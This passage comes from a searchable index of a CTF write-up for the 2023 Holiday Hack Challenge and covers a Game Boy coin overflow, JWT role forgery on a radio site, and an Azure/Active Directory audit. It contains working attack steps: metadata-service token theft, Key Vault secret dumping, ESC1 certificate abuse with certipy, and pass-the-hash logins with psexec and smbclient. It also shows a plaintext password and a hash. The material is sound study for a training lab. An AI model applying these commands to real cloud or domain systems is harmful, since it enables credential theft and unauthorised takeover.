problem now!</p> <p>Come back if you can find your way to it, and I'll tell you some secrets I've heard about this one. You can use <code>&lt;br/&gt;</code> to ensure each sentence starts on a new line.</p>"},{"location":"objectives/o17/#hints","title":"Hints","text":"Bird's Eye View <p>The location of the treasure in Rusty Quay is marked by a shiny spot on the ground. To help with navigating the maze, try zooming out and changing the camera angle.</p> Gameboy 3 <p>1) This one is a bit long, it never hurts to save your progress! 2) 8bit systems have much smaller registers than you\u2019re used to. 3) Isn\u2019t this great?!? The coins are OVERFLOWing in their abundance.</p>"},{"location":"objectives/o17/#solution","title":"Solution","text":"<p>You can find the cartridge at: </p> <p></p> <p>Two ways to go about this challenge. </p> <p>First we can pay attention to the NPC\u2019s dialogues. We collect 399 coins and jump to the right place to win. There is a cheat to this game which we can use backspace (delete) key to rewind the time. It will give us room for errors and re-do the jumping. The second way to win is to use a debugger (BGB, Gihdra) to change the hex and \u201cchange\u201d our coin balance to 999 without overflow. The 0XFE = 254 in decimal. </p> <p></p> <p>The flag is: !tom+elf! Why am I not suprisied\u3002 </p>"},{"location":"objectives/o17/#images","title":"Images","text":""},{"location":"objectives/o17/#response","title":"Response","text":"<p>Angel Candysalt (Rusty Quay)</p> <p>The life of a treasure hunter isn't easy, but it sure is exciting!</p> <p>Oh it's a video game, I love video games! But you've claimed this treasure, nicely done.</p> <p>Now, about those secrets I've been told. They're pretty cryptic, but they are. Hopefully that helps with something!</p> <p>You have all three? Wow, you must be the greatest treasure hunter that ever lived!</p>"},{"location":"objectives/o18/","title":"The Captain's Comms","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o18/#objective","title":"Objective","text":"<p>Request</p> <p>Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.</p> Chimney Scissorsticks (Brass Bouy Port) <p>Heya, think you could help Piney Sappington on Rainraster Cliffs on Pixel Island and then give me a hand?</p> <p>Ahoy there, I'm Chimney Scissorsticks!</p> <p>You may have noticed some mischief-makers planning to stir up trouble ashore.</p> <p>They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR).</p> <p>The new SDR uses some fancy JWT technology to control access.</p> <p>The captain has a knack for shortening words, some sorta abbreviation trick.</p> <p>Not familiar with JWT values? No worries; just think of it as a clue-solving game.</p> <p>I've seen that the Captain likes to carry his journal with him wherever he goes.</p> <p>If only I could find the planned \"go-date\", \"go-time\", and radio frequency they plan to use.</p> <p>Remember, the captain's abbreviations are your guiding light through this mystery!</p> <p>Once we find a JWT value, these villains won't stand a chance.</p> <p>The closer we are, the sooner we'll be thwarting their pesky plans!</p> <p>We need to recreate an administrative JWT value to successfully transmit a message.</p> <p>Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!</p>"},{"location":"objectives/o18/#hints","title":"Hints","text":"Comms Journal <p>I've seen the Captain with his Journal visiting Pixel Island!</p> Comms JWT Intro <p>A great introduction to JSON Web Tokens is available from Auth0.</p> Comms Abbreviations <p>I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.</p> Comms Private Key <p>Find a private key, update an existing JWT!</p> Comms Web Interception Proxies <p>Web Interception proxies like Burp and Zap make web sites fun!</p>"},{"location":"objectives/o18/#solution","title":"Solution","text":"<p>long winded challenge. We want to access Software Define Radio (SDR), but we don't have permissions. </p> <p>We need to read the following articles: </p> <p>https://jwt.io/introduction</p> <p>https://reqbin.com/req/c-dwjszac0/curl-post-json-example</p> <p></p> <p>The majority parts of this challenge are completed by Burp community. </p> Countdown script (with line 7 highlighted)<pre><code>GET /static/audio/static.wav HTTP/2\nHost: captainscomms.com\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6IjFmZGQwY2ExLTRlYzEtNDk1My04MjY1LTdkNzI0MmEyMTZiOCJ9.ZX7txw.UyGhVRAQ7H7pp0yvxBYiOCHO2iI\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: audio/webm,audio/ogg,audio/wav,audio/*;q=0.9,application/ogg;q=0.7,video/*;q=0.6,*/*;q=0.5\nAccept-Language: en-US,en;q=0.5\nRange: bytes=0-\nReferer: https://captainscomms.com/?&amp;challenge=capcom&amp;username=Thomasmeeee&amp;id=1fdd0ca1-4ec1-4953-8265-7d7242a216b8&amp;area=spi-brassbouyport&amp;location=30,33&amp;tokens=&amp;dna=ATATATTAATATATATATATTATAATATATATGCTATAATATATATATATATATCGATATATATATATGCATATATATTAATATATATATATATATATATATATATATTATAATATGCGC\nSec-Fetch-Dest: audio\nSec-Fetch-Mode: no-cors\nSec-Fetch-Site: same-origin\nAccept-Encoding: gzip, deflate\nTe: trailers\n\n{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\"\n}\n\n{\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioUser\"\n}\n</code></pre> <p>From captain's notes, we can get the Monitor account's token: </p> <p></p> <p>we are  the radio user, we need to access: </p> <p><code>/jwtDefault/rMonitor.tok</code></p> <p>According to hint, the SDR's key might be in the following format: <pre><code>rDecoder\nrMonitor\nrTransmitter\n</code></pre> The manual says we need to use JWT: </p> <p> </p> <p>ChatGPT: If I have a JWT token, how to use burp suite to read the file like: GET /foldername/filename?</p> <p>ChatGPT has no idea how to do it. </p> <p>We use burp to do the request: </p> <pre><code>GET /jwtDefault/rMonitor.tok HTTP/2\nHost: captainscomms.com\n</code></pre> Just code<pre><code>HTTP/2 200 OK\nContent-Type: text/html; charset=utf-8\nVary: Accept-Encoding\nX-Cloud-Trace-Context: c0347a7357b30cd5c20fef457d04aee4;o=1\nDate: Sun, 17 Dec 2023 19:09:58 GMT\nServer: Google Frontend\nCache-Control: private\nContent-Length: 556\nVia: 1.1 google, 1.1 google\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\n\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg\n\nHeaders = {\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\"\n}\n\nPayload = {\n  \"iss\": \"HHC 2023 Captain's Comms\",\n  \"iat\": 1699485795.3403327,\n  \"exp\": 1809937395.3403327,\n  \"aud\": \"Holiday Hack 2023\",\n  \"role\": \"radioMonitor\"\n}\n</code></pre> <p>We now have the monitor's signature. </p> <p><code>GET /jwtDefault/rDecoder.tok HTTP/2</code></p> <p>So we have decoder's signature. This is a security risk, the user monitor should not have permission  to access user docoder's token. </p> <p>Look at the journal below: </p> <p></p> <p><code>GET /jwtDefault/keys/capsPubKey.key HTTP/2 Host: captainscomms.com</code></p> <p>So we have captain's public key. ChatNPT is not very good at giving you a secure location if it gives everyone a similar answer.</p> <p>We need to log into the receiver as radioDecoder: </p> Just code<pre><code>GET /checkRole HTTP/2\nHost: captainscomms.com\nCookie: justWatchThisRole=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg; CaptainsCookie=eyJjYXB0YWluc1ZpY3RvcnkiOjAsInVzZXJpZCI6ImQyNTgxYTRlLTQwMWMtNDk3MC05ZDA5LTgyMmVhNGYwNTAwZCJ9.ZX9PzA.UcwL_6akWYyWeI4g_WvYUTfQs9I\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://captainscomms.com/?&amp;challenge=capcom&amp;username=Thomasmeeee&amp;id=d2581a4e-401c-4970-9d09-822ea4f0500d&amp;area=spi-brassbouyport&amp;location=29,33&amp;tokens=&amp;dna=ATATATTAATATATATATATTATAATATATATGCTATAATATATATATATATATCGATATATATATATGCATATATATTAATATATATATATATATATATATATATATTATAATATGCGC\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg\nX-Request-Item: waterfall\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n</code></pre> <p>We can now login as decoder and operate the decoder. </p> <p></p> <p>We get captain's secret folder. It has been compromised by enemy. Talking about security by obscurity. </p> <p> </p> <p>We have the frequency we need to broadcast to our enemy to lead them to the wrong place and time. </p> <p>After you login as rDecoder, it\u2019s time to get the private key from our captain. Since we have the folder name, we can make GET request via Burp Suite as: </p> <p><code>GET /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key HTTP/2</code></p> <p>Remember the hint our Captain likes abbreviations? This is how we can guess his/her key name.</p> <p>Just code<pre><code>HTTP/2 200 OK\nContent-Type: text/html; charset=utf-8\nVary: Accept-Encoding\nX-Cloud-Trace-Context: 3afec0eab361941cc6728f78d2aa8f3f\nDate: Sun, 17 Dec 2023 20:31:40 GMT\nServer: Google Frontend\nCache-Control: private\nContent-Length: 1704\nVia: 1.1 google, 1.1 google\nAlt-Svc: h3=\":443\"; ma=2592000,h3-29=\":443\"; ma=2592000\n\n-----BEGIN PRIVATE KEY-----\n&lt;private key&gt;\n-----END PRIVATE KEY-----\n</code></pre> Now it\u2019s time to generate the unique administrative with the administrative ROLE, as a TRANSMITTER. However, radioTransmitter or rTransmitter is not working. Let's look at captain's jouirnal: </p> <p> </p> <p>We have the ROLE: </p> <p><pre><code>{\n  \"header\": {\n    \"alg\": \"RS256\",\n    \"typ\": \"JWT\"\n  },\n  \"payload\": {\n    \"iss\": \"HHC 2023 Captain's Comms\",\n    \"iat\": 1699485795.3403327,\n    \"exp\": 1809937395.3403327,\n    \"aud\": \"Holiday Hack 2023\",\n    \"role\": \"GeeselslandsSuperChiefCommunicationsOfficer\"\n  }\n</code></pre> JTW token can be generated in: </p> <p></p> <p>Now, use this JWT token to open the transmitter (radio) as \u201cGeeselslandsSuperChiefCommunicationsOfficer\u201d. </p> <p>The Frequency is at: 10426 Hz. But how do we make out the time and date from?</p> <p><code>{music} {music} {music) 88323 88323 88323 {gong} {gong} (gong} {gong} {gong} {gong}12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong}</code></p> <p></p> <p>the numebr station is the key. 9 is a padding number, so the date is 12-24, at Christmas eve. The time is 1600? Looking at the background message again, we need to announce the go-time 4 hours earlier than the planned time, which is: 1200. </p> <p>Now put the Frequency 10426 Hz, date: 1224 and time: 1200</p> <p>Congrats! You outsmart the baddies with finesse! </p> <p></p>"},{"location":"objectives/o18/#response","title":"Response","text":"<p>Chimney Scissorsticks (Brass Bouy Port)</p> <p>Brilliant work! You've outsmarted those scoundrels with finesse!</p>"},{"location":"objectives/o19/","title":"Active Directory","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o19/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p> Ribb Bonbowford (Coggoggle Marina) <p>Hi there, could you do me a quick favor?</p> <p>Can you go and check on Alabaster Snowball for me? He's at Rainraster Cliffs on Pixel Island. I heard some rumors he's been experimenting with ChatNPT again and I'm a little worried about what he's cooking up.</p> <p>Thank you so much!</p> <p>Please let me know what you find out.</p> <p>Hello, I'm Ribb Bonbowford. Nice to meet you!</p> <p>Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.</p> <p>Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.</p> <p>I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.</p> <p>I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.</p> <p>Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>"},{"location":"objectives/o19/#hints","title":"Hints","text":"Useful Tools <p>It looks like Alabaster's SSH account has a couple of tools installed which might prove useful..</p> Misconfiguration ADventures <p>Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>"},{"location":"objectives/o19/#solution","title":"Solution","text":"<p>The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p> <p>This is follow up the SSH certificate quest, we have access to the admin account:</p> <pre><code>alabaster@ssh-server-vm:~$ ls -la\ntotal 36\ndrwx------ 1 alabaster alabaster 4096 Nov  9 14:07 .\ndrwxr-xr-x 1 root      root      4096 Nov  3 16:50 ..\n-rw-r--r-- 1 alabaster alabaster  220 Apr 23  2023 .bash_logout\n-rw-r--r-- 1 alabaster alabaster 3665 Nov  9 17:03 .bashrc\ndrwxr-xr-x 3 alabaster alabaster 4096 Nov  9 14:07 .cache\n-rw-r--r-- 1 alabaster alabaster  807 Apr 23  2023 .profile\ndrwxr-xr-x 6 alabaster alabaster 4096 Nov  9 14:07 .venv\n-rw------- 1 alabaster alabaster 1126 Nov  9 14:07 alabaster_todo.md\ndrwxr-xr-x 2 alabaster alabaster 4096 Nov  9 14:07 impacket\n</code></pre> <p>subscrptionid: 2b0942f3-9bca-484b-a508-abdae2db5e64</p> <p>```https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01 | jq <pre><code>```bash linenums=\"1\" hl_lines=\"7\" title=\"Just code\"\ncurl -X GET -H \"Authorization: Bearer \n&lt;Access_Token_base64&gt;\n\" \n\"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/resources?api-version=2021-04-01\" | jq \n</code></pre></p> <p>Return value:  <pre><code>{\n  \"value\": [\n    {\n      \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\n      \"name\": \"northpole-ssh-certs-kv\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n      \"location\": \"eastus\",\n      \"tags\": {}\n    },\n    {\n      \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv\",\n      \"name\": \"northpole-it-kv\",\n      \"type\": \"Microsoft.KeyVault/vaults\",\n      \"location\": \"eastus\",\n      \"tags\": {}\n    }\n  ]\n}\n</code></pre></p> <p>We then use Resources \u2013 Get to enumerate: </p> <p><code>\"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv?api-version=2023-02-01\" | jq</code></p> <p>Return value:  <pre><code>{\n  \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv\",\n  \"name\": \"northpole-ssh-certs-kv\",\n  \"type\": \"Microsoft.KeyVault/vaults\",\n  \"location\": \"eastus\",\n  \"tags\": {},\n  \"systemData\": {\n    \"createdBy\": \"thomas@sanshhc.onmicrosoft.com\",\n    \"createdByType\": \"User\",\n    \"createdAt\": \"2023-11-12T01:47:13.059Z\",\n    \"lastModifiedBy\": \"thomas@sanshhc.onmicrosoft.com\",\n    \"lastModifiedByType\": \"User\",\n    \"lastModifiedAt\": \"2023-11-12T01:50:52.742Z\"\n  },\n  \"properties\": {\n    \"sku\": {\n      \"family\": \"A\",\n      \"name\": \"standard\"\n    },\n    \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n    \"accessPolicies\": [\n      {\n        \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n        \"objectId\": \"0bc7ae9d-292d-4742-8830-68d12469d759\",\n        \"permissions\": {\n          \"keys\": [\n            \"all\"\n          ],\n          \"secrets\": [\n            \"all\"\n          ],\n          \"certificates\": [\n            \"all\"\n          ],\n          \"storage\": [\n            \"all\"\n          ]\n        }\n      },\n      {\n        \"tenantId\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n        \"objectId\": \"1b202351-8c85-46f1-81f8-5528e92eb7ce\",\n        \"permissions\": {\n          \"secrets\": [\n            \"get\"\n          ]\n        }\n      }\n    ],\n    \"enabledForDeployment\": false,\n    \"enableSoftDelete\": true,\n    \"softDeleteRetentionInDays\": 90,\n    \"vaultUri\": \"https://northpole-ssh-certs-kv.vault.azure.net/\",\n    \"provisioningState\": \"Succeeded\",\n    \"publicNetworkAccess\": \"Enabled\"\n  }\n}\n</code></pre></p>"},{"location":"objectives/o19/#get-the-new-access-token","title":"Get the new access token:","text":"<p><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://vault.azure.net' -H Metadata:true -s | jq</code></p> <p>We need to record the base64 access token returned to us. </p>"},{"location":"objectives/o19/#key-valut-password","title":"KEY VALUT password:","text":"<p>Request a new Token: </p> <p><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s | jq</code></p> <p>Use the new token to make request: </p> Just code<pre><code>curl -X GET -H \"Authorization: Bearer &lt;New_Token&gt;\" \"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv/privateEndpointConnections?api-version=2022-07-01\" | jq\n</code></pre>"},{"location":"objectives/o19/#get-the-secret-name","title":"Get the secret name:","text":"<p>\"https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4\" | jq</p> <p>\"https://northpole-it-kv.vault.azure.net/certificates/issuers?api-version=7.4\" | jq</p> <p>\"https://northpole-it-kv.vault.azure.net/certificates?api-version=7.4\" | jq</p>"},{"location":"objectives/o19/#get-the-secret-content-by-its-name","title":"Get the secret content by its name:","text":"<p><code>\"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4\" | jq</code></p> <p>We can use the syntax  <code>curl -X GET -H \"Authorization: Bearer &lt;New_Token&gt;\"</code> followed by above commands to request those resources!!!</p> <pre><code>{\n  \"value\": \"Import-Module ActiveDirectory; $UserName = \\\"elfy\\\"; $UserDomain = \\\"northpole.local\\\"; $UserUPN = \\\"$UserName@$UserDomain\\\"; $Password = ConvertTo-SecureString \\\"J4`ufC49/J4766\\\" -AsPlainText -Force; $DCIP = \\\"10.0.0.53\\\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \\\"\\\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru\",\n  \"id\": \"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d\",\n  \"attributes\": {\n    \"enabled\": true,\n    \"created\": 1699564823,\n    \"updated\": 1699564823,\n    \"recoveryLevel\": \"Recoverable+Purgeable\",\n    \"recoverableDays\": 90\n  },\n  \"tags\": {}\n}\n</code></pre> <p>Refer back to penetration test report challenge, there is a vulnerability in certificate template used in active directory Certificate Services. </p> <p><code>https://github.com/ly4k/Certipy</code></p> Just code<pre><code>certipy find -u elfy@northpole.local -p J4\\`ufC49\\/J4766 -dc-ip 10.0.0.53\ncertipy find -vulnerable -u elfy@northpole.local -p J4\\`ufC49\\/J4766 -dc-ip 10.0.0.53\n</code></pre> <pre><code>[!] Vulnerabilities\n      ESC1                              : 'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication\n</code></pre> <p>Result suggest the server is vulnerable to ESC1. </p>"},{"location":"objectives/o19/#command-to-get-the-certificate-according-to-template","title":"Command to get the certificate according to template:","text":"<p><code>certipy req -u elfy@northpole.local -p J4\\`ufC49\\/J4766 -dc-ip 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers</code></p>"},{"location":"objectives/o19/#command-to-exploit-esc1-vulnerability","title":"Command to exploit ESC1 vulnerability:","text":"<p><code>certipy req -u elfy@northpole.local -p J4\\`ufC49\\/J4766 -dc-ip 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers -target northpole.local -upn researchers@northpole.local -dns npdc01.northpole.local</code></p>"},{"location":"objectives/o19/#get-the-file-share-name","title":"Get the file share name:","text":"<p><code>smbclient.py northpole.local/elfy:J4\\`ufC49\\/J4766@10.0.0.53</code></p> Just code<pre><code># shares\nADMIN$\nC$\nD$\nFileShare\nIPC$\nNETLOGON\nSYSVOL\n\n# use FileShare\n# ls\ndrw-rw-rw-          0  Sat Dec 16 01:15:23 2023 .\ndrw-rw-rw-          0  Sat Dec 16 01:15:20 2023 ..\n-rw-rw-rw-     701028  Sat Dec 16 01:15:23 2023 Cookies.pdf\n-rw-rw-rw-    1521650  Sat Dec 16 01:15:23 2023 Cookies_Recipe.pdf\n-rw-rw-rw-      54096  Sat Dec 16 01:15:23 2023 SignatureCookies.pdf\ndrw-rw-rw-          0  Sat Dec 16 01:15:23 2023 super_secret_research\n-rw-rw-rw-        165  Sat Dec 16 01:15:23 2023 todo.txt\n</code></pre> <p><code>alabaster@ssh-server-vm:~/impacket$ lookupsid.py northpole.local/elfy:J4\\`ufC49\\/J4766@10.0.0.53</code></p> <p>Returns notable results: </p> <pre><code>1103: NORTHPOLE\\researchers (SidTypeGroup)\n1105: NORTHPOLE\\wombleycube (SidTypeUser)\n</code></pre> <p>To confirm wombley is our suspect:  <code>GetADUsers.py northpole.local/elfy:'J4`ufC49/J4766' -dc-ip 10.0.0.53 -all</code></p> <p>Since Wombley Cube is a researcher in Noir island, you can probably start exploiting ESC1 from this step. </p> <p><code>certipy req -u elfy@northpole.local -p J4\\`ufC49\\/J4766 -dc-ip 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers -target northpole.local -upn researchers@northpole.local -dns npdc01.northpole.local</code></p>"},{"location":"objectives/o19/#to-become-wombley","title":"To become Wombley","text":"<p><code>certipy req -u elfy@northpole.local -p J4\\`ufC49\\/J4766 -dc-ip 10.0.0.53 -ca northpole-npdc01-CA -template NorthPoleUsers -target northpole.local -upn wombleycube@northpole.local -dns npdc01.northpole.local</code></p> <p><code>certipy auth -pfx administrator_dc.pfx -dc-ip 10.0.0.53</code></p> <p><code>certipy auth -pfx wombleycube_npdc01.pfx -dc-ip 10.0.0.53</code></p> <p><code>psexec.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23</code> psexec shows the \u2018FileShare\u2019 is not writable. </p> <pre><code>smbclient.py northpole.local/wombleycube@10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23\n\n# cat todo.txt\n1. Bake some cookies.\n2. Restrict access to C:\\FileShare\\super_secret_research to only researchers so everyone cant see the folder or read its contents\n3. Profit\n\n# cd super_secret_research\n# cat InstructionsForEnteringSatelliteGroundStation.txt\nNote to self:\n\nTo enter the Satellite Ground Station (SGS), say the following into the speaker:\n\nAnd he whispered, 'Now I shall be out of sight;\nSo through the valley and over the height.'\nAnd he'll silently take his way.\n</code></pre>"},{"location":"objectives/o19/#images","title":"Images","text":"<p>I stole wombley's secret cookies, if you are interested in cooking yourself a Christmas meal: </p> <p></p>"},{"location":"objectives/o19/#the-method-is-base64-encoding-and-decoding","title":"The method is base64 encoding and decoding!","text":"<p>Answer</p> <p>The secret file is: InstructionsForEnteringSatelliteGroundStation.txt AND cookies.pdf</p>"},{"location":"objectives/o19/#response","title":"Response","text":"<p>Ribb Bonbowford </p> <p>Wow, nice work. I'm impressed! </p> <p>This is all starting to feel like more than just a coincidence though. Everything Alabaster's been setting up lately with the help of ChatNPT contains all these vulnerabilities. It almost feels deliberate, if you ask me.</p> <p>Now obviously an LLM AI like ChatNPT cannot have deliberate motivations itself. It's just a machine. But I wonder who could have built it and who is controlling it?</p> <p>On top of that, we apparently have a satellite ground station on Geese Islands. I wonder where that thing would even be located.</p> <p>Well, I guess it's probably somewhere on Space Island, but I've not been there yet.</p> <p>I'm not a big fan of jungles, you see. I have this tendency to get lost in them.</p> <p>Anyway, if you feel like investigating, that'd be where I'd go look.</p> <p>Good luck and I'd try and steer clear of ChatNPT if I were you.</p>"},{"location":"objectives/o2/","title":"Snowball Fight","text":"<p>Difficulty:  Direct link: Objective 2 website</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Request</p> <p>Visit Christmas Island and talk to Morcel Nougat about this great new game. Team up with another player and show Morcel how to win against Santa!</p> Morcel Nougat (Frosty's Beach) <p>Fight with Santa and his Crew to win the game  I made that up... </p>"},{"location":"objectives/o2/#hints","title":"Hints","text":"No hints <p>N/A</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":"<p>This challenge you can complete it manually by just playing it and defeat the elfs and Santa. Or you can choose to use BURP to intercept and change some parameters to give you a upperhand against Santa's crew. Or you can use web developer tools in your browser and use java script to modify the player and elf's attributes. </p> <p>The code below will make elf recultant to throw the ball.  Java script<pre><code>this.elfThrowDelay = 2000000\n</code></pre></p> <p>The function below will lock player's health:  // Function to lock the player's health</p>"},{"location":"objectives/o2/#code-blocks","title":"Code blocks","text":"<p>Java script<pre><code>function lockPlayerHealth(healthValue) {\n  if (window.playerHealthLock) {\n    clearInterval(window.playerHealthLock);\n  }\n\n  window.playerHealthLock = setInterval(() =&gt; {\n    if (typeof player !== 'undefined' &amp;&amp; player.health !== healthValue) {\n      player.health = healthValue;\n      console.log('Player health locked at', healthValue);\n    }\n  }, 100); // 